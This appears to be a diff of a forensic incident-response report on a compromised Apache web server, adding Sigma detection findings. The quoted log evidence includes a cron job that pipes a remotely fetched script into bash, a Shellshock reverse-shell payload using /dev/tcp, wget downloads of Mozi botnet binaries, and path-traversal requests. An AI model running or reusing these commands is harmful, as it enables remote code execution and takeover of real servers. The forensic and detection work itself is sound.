@@ -10,11 +10,11 @@
 
   FINDING SUMMARY
     CRITICAL   4
-    HIGH       45
-    MEDIUM     19
-    LOW        3
+    HIGH       52
+    MEDIUM     25
+    LOW        14
     INFO       9
-    TOTAL      80
+    TOTAL      104
 
   HEADLINES
     [CRITICAL] 1 address(es) authenticated successfully after failing
@@ -74,7 +74,7 @@
       | PID 24330   daemon     /tmp/agettyd (deleted)                 agettyd -c noresetd
 
 ----------------------------------------------------------------------------------------------------
- HIGH FINDINGS (45)
+ HIGH FINDINGS (52)
 ----------------------------------------------------------------------------------------------------
 
 [HIGH/1] 198 source address(es) with 10+ failed logins
@@ -541,8 +541,105 @@
       | VAR_LOG message: [5008328.239136] audit: type=1309 audit(1638800295.833:15786586): argc=3 a0="pkill" a1="-9" a2="xmrig"
       | VAR_LOG message: [5109130.296539] audit: type=1309 audit(1638901097.882:16421345): argc=3 a0="pkill" a1="-9" a2="xmrig"
 
+[HIGH/46] Sigma rule matched: Code Injection by ld.so Preload
+    category : Detection
+    att&ck   : T1574.006
+    artifact : VAR_LOG
+    seen     : 1 occurrence(s), 2021-11-19 01:30:57 UTC
+    1 row(s) in VAR_LOG - Detects the ld.so preload persistence file. See `man ld.so` for more
+    information.
+      | timestamp_utc=2021-11-19 01:30:57; timestamp=Nov 19 01:30:57; host=ApacheWebServer; process=kernel; message=[3493490.184715] audit: type=1309 audit(1637285452.056:6538221): argc=3 a0="c...; log=/var/log/kern.log.3.gz; line_no=76200
+
+[HIGH/47] Sigma rule matched: Suspicious Activity in Shell Commands
+    category : Detection
+    att&ck   : T1059.004
+    artifact : VAR_LOG
+    seen     : 3 occurrence(s), 2021-12-01 16:37:02 .. 2021-12-07 22:09:03 UTC
+    3 row(s) in VAR_LOG - Detects suspicious shell commands used in various exploit codes (see
+    references)
+      | timestamp_utc=2021-12-07 22:09:03; timestamp=Dec  7 22:09:03; host=ApacheWebServer; process=CRON; pid=2743; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.1; line_no=2332
+      | timestamp_utc=2021-12-05 22:19:01; timestamp=Dec  5 22:19:01; host=ApacheWebServer; process=CRON; pid=18752; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.3.gz; line_no=5742
+      | timestamp_utc=2021-12-01 16:37:02; timestamp=Dec  1 16:37:02; host=ApacheWebServer; process=CRON; pid=17652; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.7.gz; line_no=1299
+
+[HIGH/48] Sigma rule matched: Code Injection by ld.so Preload
+    category : Detection
+    att&ck   : T1574.006
+    artifact : WEB_LOG
+    seen     : 201 occurrence(s), 2021-10-07 23:00:08 .. 2021-11-15 13:16:23 UTC
+    201+ row(s) in WEB_LOG - Detects the ld.so preload persistence file. See `man ld.so` for
+    more information.
+      | client_ip=198.18.0.38; timestamp_utc=2021-11-13 07:02:18; timestamp_raw=Sat Nov 13 07:02:18.142526 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.39; timestamp_utc=2021-11-14 00:19:20; timestamp_raw=Sun Nov 14 00:19:20.330232 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.39; timestamp_utc=2021-11-14 00:19:23; timestamp_raw=Sun Nov 14 00:19:23.359771 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.40; timestamp_utc=2021-11-14 04:41:37; timestamp_raw=Sun Nov 14 04:41:37.773492 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.40; timestamp_utc=2021-11-14 04:41:40; timestamp_raw=Sun Nov 14 04:41:40.620170 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.40; timestamp_utc=2021-11-14 18:33:46; timestamp_raw=Sun Nov 14 18:33:46.253632 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.40; timestamp_utc=2021-11-15 00:26:30; timestamp_raw=Mon Nov 15 00:26:30.211162 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.40; timestamp_utc=2021-11-15 00:26:48; timestamp_raw=Mon Nov 15 00:26:48.678957 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.39; timestamp_utc=2021-11-15 06:41:16; timestamp_raw=Mon Nov 15 06:41:16.558182 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.39; timestamp_utc=2021-11-15 06:41:35; timestamp_raw=Mon Nov 15 06:41:35.918055 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+
+[HIGH/49] Sigma rule matched: Suspicious Activity in Shell Commands
+    category : Detection
+    att&ck   : T1059.004
+    artifact : WEB_LOG
+    seen     : 19 occurrence(s), 2021-11-07 10:39:12 .. 2021-11-28 07:23:40 UTC
+    19 row(s) in WEB_LOG - Detects suspicious shell commands used in various exploit codes (see
+    references)
+      | client_ip=198.18.0.41; timestamp_utc=2021-11-11 19:08:22; timestamp_raw=Thu Nov 11 19:08:22.859342 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=803
+      | client_ip=198.18.0.41; timestamp_utc=2021-11-11 19:08:22; timestamp_raw=Thu Nov 11 19:08:22.865585 2021; server=apache2; kind=error; level=error; module=cgi; code=AH01215
+      | client_ip=198.18.0.41; timestamp_utc=2021-11-11 19:09:46; timestamp_raw=Thu Nov 11 19:09:46.456875 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=804
+      | client_ip=198.18.0.42; timestamp_utc=2021-11-14 08:11:57; timestamp_raw=Sun Nov 14 08:11:57.251754 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.42; timestamp_utc=2021-11-14 08:19:57; timestamp_raw=Sun Nov 14 08:19:57.031706 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.42; timestamp_utc=2021-11-17 07:20:51; timestamp_raw=Wed Nov 17 07:20:51.903472 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.43; timestamp_utc=2021-11-18 06:36:07; timestamp_raw=Thu Nov 18 06:36:07.545417 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.43; timestamp_utc=2021-11-18 06:37:45; timestamp_raw=Thu Nov 18 06:37:45.396915 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.42; timestamp_utc=2021-11-28 07:21:43; timestamp_raw=Sun Nov 28 07:21:43.502206 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.42; timestamp_utc=2021-11-28 07:23:40; timestamp_raw=Sun Nov 28 07:23:40.903543 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+
+[HIGH/50] Sigma rule matched: Suspicious Reverse Shell Command Line
+    category : Detection
+    att&ck   : T1059.004
+    artifact : WEB_LOG
+    seen     : 9 occurrence(s), 2021-10-15 18:54:35 .. 2021-11-28 04:14:34 UTC
+    9 row(s) in WEB_LOG - Detects suspicious shell commands or program code that may be executed
+    or used in command line to establish a reverse shell
+      | status=500; method=GET; resource=/cgi-bin/test-cgi; client_ip=198.18.0.44; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-27 12:08:08; timestamp_raw=27/Nov/2021:12:08:08 +0000; server=apache2
+      | status=404; method=GET; resource=/cgi-bin/index.cgi; client_ip=198.18.0.46; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-27 17:05:05; timestamp_raw=27/Nov/2021:17:05:05 +0000; server=apache2
+      | status=200; method=GET; resource=/; client_ip=198.18.0.47; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-28 04:14:34; timestamp_raw=28/Nov/2021:04:14:34 +0000; server=apache2
+      | client_ip=198.18.0.48; timestamp_utc=2021-10-15 18:54:35; timestamp_raw=Fri Oct 15 18:54:35.802802 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.49; timestamp_utc=2021-10-25 20:31:41; timestamp_raw=Mon Oct 25 20:31:41.719778 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.50; timestamp_utc=2021-11-07 13:46:29; timestamp_raw=Sun Nov 07 13:46:29.564806 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.44; timestamp_utc=2021-11-27 12:08:08; timestamp_raw=Sat Nov 27 12:08:08.514187 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.46; timestamp_utc=2021-11-27 17:05:05; timestamp_raw=Sat Nov 27 17:05:05.142457 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.47; timestamp_utc=2021-11-28 04:14:34; timestamp_raw=Sun Nov 28 04:14:34.825329 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+
+[HIGH/51] Sigma rule matched: Shellshock Expression
+    category : Detection
+    att&ck   : T1505.003
+    artifact : WEB_LOG
+    seen     : 6 occurrence(s), 2021-11-27 12:08:08 .. 2021-11-28 04:14:34 UTC
+    6 row(s) in WEB_LOG - Detects shellshock expressions in log files
+      | status=500; method=GET; resource=/cgi-bin/test-cgi; client_ip=198.18.0.44; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-27 12:08:08; timestamp_raw=27/Nov/2021:12:08:08 +0000; server=apache2
+      | status=404; method=GET; resource=/cgi-bin/index.cgi; client_ip=198.18.0.46; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-27 17:05:05; timestamp_raw=27/Nov/2021:17:05:05 +0000; server=apache2
+      | status=200; method=GET; resource=/; client_ip=198.18.0.47; user_agent=() { :; }; /bin/bash -i >& /dev/tcp/198.18.0.45/15347 0<&1 2>&1; timestamp_utc=2021-11-28 04:14:34; timestamp_raw=28/Nov/2021:04:14:34 +0000; server=apache2
+      | client_ip=198.18.0.44; timestamp_utc=2021-11-27 12:08:08; timestamp_raw=Sat Nov 27 12:08:08.514187 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.46; timestamp_utc=2021-11-27 17:05:05; timestamp_raw=Sat Nov 27 17:05:05.142457 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.47; timestamp_utc=2021-11-28 04:14:34; timestamp_raw=Sun Nov 28 04:14:34.825329 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+
+[HIGH/52] Sigma rule matched: Server Side Template Injection Strings
+    category : Detection
+    att&ck   : T1221
+    artifact : WEB_LOG
+    seen     : 4 occurrence(s), 2021-11-28 20:00:34 .. 2021-11-28 20:26:26 UTC
+    4 row(s) in WEB_LOG - Detects SSTI attempts sent via GET requests in access logs
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:00:34; timestamp_raw=Sun Nov 28 20:00:34.841791 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:08:15; timestamp_raw=Sun Nov 28 20:08:15.277127 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:24:13; timestamp_raw=Sun Nov 28 20:24:13.153432 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:26:26; timestamp_raw=Sun Nov 28 20:26:26.246581 2021; server=apache2; kind=error; protocol=HTTP/1.0
+
 ----------------------------------------------------------------------------------------------------
- MEDIUM FINDINGS (19)
+ MEDIUM FINDINGS (25)
 ----------------------------------------------------------------------------------------------------
 
 [MEDI/1] Account(s) present in /etc/passwd but not in the backup copy
@@ -606,8 +703,8 @@
       | /home/azureuser/.bash_history: wget https://dlcdn.apache.org//httpd/httpd-2.4.49.tar.gz   [remote download]
       | /home/azureuser/.bash_history: wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-oss-7.15.0-amd64.deb   [remote download]
       | /home/azureuser/.bash_history: wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -   [remote download]
-      | /home/azureuser/.bash_history: wget http://198.18.0.37:59245/Mozi.m   [remote download]
-      | /home/azureuser/.bash_history: wget http://198.18.0.38/unk.sh   [remote download]
+      | /home/azureuser/.bash_history: wget http://198.18.0.52:59245/Mozi.m   [remote download]
+      | /home/azureuser/.bash_history: wget http://198.18.0.37/unk.sh   [remote download]
       | /home/azureuser/.bash_history: cat error_log | egrep "curl|wget"   [remote download]
       | /home/azureuser/.bash_history: cat error_log | egrep "curl|wget" | perl -ne 's/.*/data\-HEAP...(.*)/2/g; print;'   [remote download]
       | /home/azureuser/.bash_history: cat error_log | egrep "curl|wget" | perl -ne 's/.*data\-HEAP...(.*)/2/g; print;'   [remote download]
@@ -618,10 +715,10 @@
       | /home/azureuser/.bash_history: cat error_log | egrep "curl|wget"  | grep -v Agent   [remote download]
       | /home/azureuser/.bash_history: cat error_log | egrep "curl|wget"  | grep -v Agent   [remote download]
       | /home/azureuser/.bash_history: egrep -i "curl|wget" error_log   [remote download]
-      | /home/azureuser/.bash_history: wget http://198.18.0.39:58061/Mozi.a   [remote download]
-      | /home/azureuser/.bash_history: wget http://198.18.0.40/wget.sh   [remote download]
+      | /home/azureuser/.bash_history: wget http://198.18.0.53:58061/Mozi.a   [remote download]
+      | /home/azureuser/.bash_history: wget http://198.18.0.54/wget.sh   [remote download]
       | /home/azureuser/.bash_history: cat wget.sh   [remote download]
-      | /home/azureuser/.bash_history: wget http://198.18.0.41/bins/   [remote download]
+      | /home/azureuser/.bash_history: wget http://198.18.0.55/bins/   [remote download]
       | /home/azureuser/.bash_history: rm wget.sh   [remote download]
       | /root/.bash_history: grep wget .bash_history   [remote download]
       | /root/.bash_history: insmod ./lime-5.4.0-1059-azure.ko "path=ubuntu.mem format=lime"   [kernel module load]
@@ -685,13 +782,13 @@
     att&ck   : T1071 Application Layer Protocol
     artifact : live_response/network/ss_-anp.txt
     seen     : 7 occurrence(s), 2021-11-19 01:05:40 .. 2021-12-08 16:12:25 UTC
-      | tcp    ESTAB       10.0.0.4:33680           198.18.0.42:443         filebeat(pid 27359)
-      | tcp    ESTAB       10.0.0.4:33610           198.18.0.43:443           filebeat(pid 27359)
-      | tcp    ESTAB       10.0.0.4:33612           198.18.0.43:443           filebeat(pid 27359)
-      | tcp    ESTAB       10.0.0.4:44214           198.18.0.44:443       agettyd(pid 24330)
+      | tcp    ESTAB       10.0.0.4:33680           198.18.0.56:443         filebeat(pid 27359)
+      | tcp    ESTAB       10.0.0.4:33610           198.18.0.57:443           filebeat(pid 27359)
+      | tcp    ESTAB       10.0.0.4:33612           198.18.0.57:443           filebeat(pid 27359)
+      | tcp    ESTAB       10.0.0.4:44214           198.18.0.58:443       agettyd(pid 24330)
       | tcp    ESTAB       10.0.0.4:22              198.18.0.0:29953     sshd(pid 4204), sshd(pid 4092)
-      | tcp    ESTAB       10.0.0.4:46202           198.18.0.45:443        filebeat(pid 27359)
-      | tcp    ESTAB       10.0.0.4:46200           198.18.0.45:443        filebeat(pid 27359)
+      | tcp    ESTAB       10.0.0.4:46202           198.18.0.59:443        filebeat(pid 27359)
+      | tcp    ESTAB       10.0.0.4:46200           198.18.0.59:443        filebeat(pid 27359)
 
 [MEDI/10] Suspicious content in scheduled task definitions
     category : Persistence
@@ -784,8 +881,94 @@
       | 2021-12-08  06:25:23  /usr/bin/unattended-upgrade  (by root)
       | 2021-12-08  06:25:34  /usr/bin/unattended-upgrade  (by root)
 
+[MEDI/20] Sigma rule matched: Potentially Suspicious Execution From Tmp Folder
+    category : Detection
+    att&ck   : T1036
+    artifact : PROCESSES
+    seen     : 1 occurrence(s), 2021-12-05 08:28:02 UTC
+    1 row(s) in PROCESSES - Detects a potentially suspicious execution of a process located in
+    the '/tmp/' folder
+      | pid=24330; ppid=1; user=daemon; owner=daemon; group=daemon; start_utc=2021-12-05 08:28:02+00:00; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link
+
+[MEDI/21] Sigma rule matched: Potentially Suspicious Execution From Tmp Folder
+    category : Detection
+    att&ck   : T1036
+    artifact : PROCESS_MASTER
+    seen     : 1 occurrence(s), 2021-12-05 08:28:02 UTC
+    1 row(s) in PROCESS_MASTER - Detects a potentially suspicious execution of a process located
+    in the '/tmp/' folder
+      | pid=24330; ppid=1; parent=systemd; user=daemon; state=S; comm=agettyd; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link
+
+[MEDI/22] Sigma rule matched: Modifying Crontab
+    category : Detection
+    att&ck   : T1053.003
+    artifact : VAR_LOG
+    seen     : 201 occurrence(s), 2021-12-07 10:06:17 .. 2021-12-08 15:59:14 UTC
+    201+ row(s) in VAR_LOG - Detects suspicious modification of crontab file.
+      | timestamp_utc=2021-12-07 10:06:26; timestamp=Dec  7 10:06:26; host=ApacheWebServer; process=crontab; pid=18355; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=559
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18358; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=561
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18361; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=563
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18364; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=565
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18367; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=567
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18370; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=569
+      | timestamp_utc=2021-12-07 10:06:27; timestamp=Dec  7 10:06:27; host=ApacheWebServer; process=crontab; pid=18373; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=571
+      | timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18376; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=573
+      | timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18379; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=575
+      | timestamp_utc=2021-12-07 10:06:28; timestamp=Dec  7 10:06:28; host=ApacheWebServer; process=crontab; pid=18384; message=(daemon) REPLACE (daemon); log=/var/log/syslog.1; line_no=578
+
+[MEDI/23] Sigma rule matched: Suspicious Use of /dev/tcp
+    category : Detection
+    artifact : WEB_LOG
+    seen     : 13 occurrence(s), 2021-10-15 18:54:35 .. 2021-11-28 20:26:26 UTC
+    13 row(s) in WEB_LOG - Detects suspicious command with /dev/tcp
+      | client_ip=198.18.0.48; timestamp_utc=2021-10-15 18:54:35; timestamp_raw=Fri Oct 15 18:54:35.802802 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.49; timestamp_utc=2021-10-25 20:31:41; timestamp_raw=Mon Oct 25 20:31:41.719778 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.50; timestamp_utc=2021-11-07 13:46:29; timestamp_raw=Sun Nov 07 13:46:29.564806 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | client_ip=198.18.0.44; timestamp_utc=2021-11-27 12:08:08; timestamp_raw=Sat Nov 27 12:08:08.514187 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.46; timestamp_utc=2021-11-27 17:05:05; timestamp_raw=Sat Nov 27 17:05:05.142457 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.47; timestamp_utc=2021-11-28 04:14:34; timestamp_raw=Sun Nov 28 04:14:34.825329 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:00:34; timestamp_raw=Sun Nov 28 20:00:34.841791 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:08:15; timestamp_raw=Sun Nov 28 20:08:15.277127 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:24:13; timestamp_raw=Sun Nov 28 20:24:13.153432 2021; server=apache2; kind=error; protocol=HTTP/1.0
+      | method=GET; resource=${DOC}; client_ip=198.18.0.51; timestamp_utc=2021-11-28 20:26:26; timestamp_raw=Sun Nov 28 20:26:26.246581 2021; server=apache2; kind=error; protocol=HTTP/1.0
+
+[MEDI/24] Sigma rule matched: Path Traversal Exploitation Attempts
+    category : Detection
+    att&ck   : T1190
+    artifact : WEB_LOG
+    seen     : 42 occurrence(s), 2021-10-15 06:08:58 .. 2021-12-02 16:01:58 UTC
+    42 row(s) in WEB_LOG - Detects path traversal exploitation attempts
+      | method=GET; resource=/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%2...; client_ip=198.18.0.60; timestamp_utc=2021-11-26 05:04:43; timestamp_raw=Fri Nov 26 05:04:43.004490 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25...; client_ip=198.18.0.60; timestamp_utc=2021-11-26 05:28:51; timestamp_raw=Fri Nov 26 05:28:51.381805 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%2...; client_ip=198.18.0.61; timestamp_utc=2021-11-26 21:59:41; timestamp_raw=Fri Nov 26 21:59:41.616235 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25...; client_ip=198.18.0.61; timestamp_utc=2021-11-26 21:59:42; timestamp_raw=Fri Nov 26 21:59:42.143540 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%2...; client_ip=198.18.0.61; timestamp_utc=2021-11-26 22:14:53; timestamp_raw=Fri Nov 26 22:14:53.528571 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25...; client_ip=198.18.0.61; timestamp_utc=2021-11-26 22:14:54; timestamp_raw=Fri Nov 26 22:14:54.091859 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%2...; client_ip=198.18.0.62; timestamp_utc=2021-12-02 08:19:50; timestamp_raw=Thu Dec 02 08:19:50.776583 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25...; client_ip=198.18.0.62; timestamp_utc=2021-12-02 08:29:19; timestamp_raw=Thu Dec 02 08:29:19.927320 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%2...; client_ip=198.18.0.63; timestamp_utc=2021-12-02 14:42:09; timestamp_raw=Thu Dec 02 14:42:09.736753 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%25...; client_ip=198.18.0.64; timestamp_utc=2021-12-02 16:01:58; timestamp_raw=Thu Dec 02 16:01:58.311679 2021; server=apache2; kind=error; protocol=HTTP/1.1
+
+[MEDI/25] Sigma rule matched: Source Code Enumeration Detection by Keyword
+    category : Detection
+    att&ck   : T1083
+    artifact : WEB_LOG
+    seen     : 28 occurrence(s), 2021-10-13 04:10:17 .. 2021-11-30 21:49:38 UTC
+    28 row(s) in WEB_LOG - Detects source code enumeration that use GET requests by keyword
+    searches in URL strings
+      | method=GET; resource=/.git/config; client_ip=198.18.0.65; timestamp_utc=2021-11-06 20:17:38; timestamp_raw=Sat Nov 06 20:17:38.317826 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.66; timestamp_utc=2021-11-12 15:49:55; timestamp_raw=Fri Nov 12 15:49:55.723074 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.67; timestamp_utc=2021-11-12 19:16:23; timestamp_raw=Fri Nov 12 19:16:23.210227 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | client_ip=198.18.0.68; timestamp_utc=2021-11-13 08:11:55; timestamp_raw=Sat Nov 13 08:11:55.561248 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=4449
+      | method=GET; resource=/.git/config; client_ip=198.18.0.69; timestamp_utc=2021-11-14 20:57:49; timestamp_raw=Sun Nov 14 20:57:49.726743 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.69; timestamp_utc=2021-11-16 19:31:22; timestamp_raw=Tue Nov 16 19:31:22.710482 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.69; timestamp_utc=2021-11-22 20:53:44; timestamp_raw=Mon Nov 22 20:53:44.989925 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/HEAD; client_ip=198.18.0.70; timestamp_utc=2021-11-28 05:59:17; timestamp_raw=Sun Nov 28 05:59:17.912930 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.71; timestamp_utc=2021-11-29 00:17:59; timestamp_raw=Mon Nov 29 00:17:59.656640 2021; server=apache2; kind=error; protocol=HTTP/1.1
+      | method=GET; resource=/.git/config; client_ip=198.18.0.69; timestamp_utc=2021-11-30 21:49:38; timestamp_raw=Tue Nov 30 21:49:38.479821 2021; server=apache2; kind=error; protocol=HTTP/1.1
+
 ----------------------------------------------------------------------------------------------------
- LOW FINDINGS (3)
+ LOW FINDINGS (14)
 ----------------------------------------------------------------------------------------------------
 
 [LOW/1] 179 non-executable file(s) in temp / shared-memory directories
@@ -859,6 +1042,157 @@
     seen     : 2 occurrence(s), 2021-10-10 17:03:59 .. 2021-11-19 01:36:35 UTC
       | tcp    LISTEN      0.0.0.0:25324            0.0.0.0:*                omsagent(pid 828)
       | tcp    LISTEN      *:80                     *:*                      httpd(pid 2632), httpd(pid 2539), httpd(pid 1813), httpd(pid 1693), httpd(pid 801)
+
+[LOW/4] Sigma rule matched: Process Discovery
+    category : Detection
+    att&ck   : T1057
+    artifact : PROCESSES
+    seen     : 1 occurrence(s), 2021-12-08 18:51:34 UTC
+    1 row(s) in PROCESSES - Detects process discovery commands. Adversaries may attempt to get
+    information about running processes on a system.
+    Information obtained could be used to gain an understanding of common software/applications
+    running on systems within the network
+    
+      | pid=7746; user=root; start_utc=2021-12-08 18:51:34+00:00; exe=/bin/ps; exe_source=journal _EXE (same boot); args=ps -eo pid,user,lstart,args
+
+[LOW/5] Sigma rule matched: Scheduled Task/Job At
+    category : Detection
+    att&ck   : T1053.002
+    artifact : PROCESSES
+    seen     : 1 occurrence(s), 2021-10-09 15:06:25 UTC
+    1 row(s) in PROCESSES - Detects the use of at/atd which are utilities that are used to
+    schedule tasks.
+    They are often abused by adversaries to maintain persistence or to perform task scheduling
+    for initial or recurring execution of malicious code
+    
+      | pid=1003; ppid=1; user=daemon; owner=root; group=root; start_utc=2021-10-09 15:06:25+00:00; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link
+
+[LOW/6] Sigma rule matched: System Network Connections Discovery - Linux
+    category : Detection
+    att&ck   : T1049
+    artifact : PROCESSES
+    seen     : 2 occurrence(s)
+    2 row(s) in PROCESSES - Detects usage of system utilities to discover system network
+    connections
+      | pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor
+      | pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor
+
+[LOW/7] Sigma rule matched: Process Discovery
+    category : Detection
+    att&ck   : T1057
+    artifact : PROCESS_MASTER
+    seen     : 1 occurrence(s), 2021-12-08 18:51:34 UTC
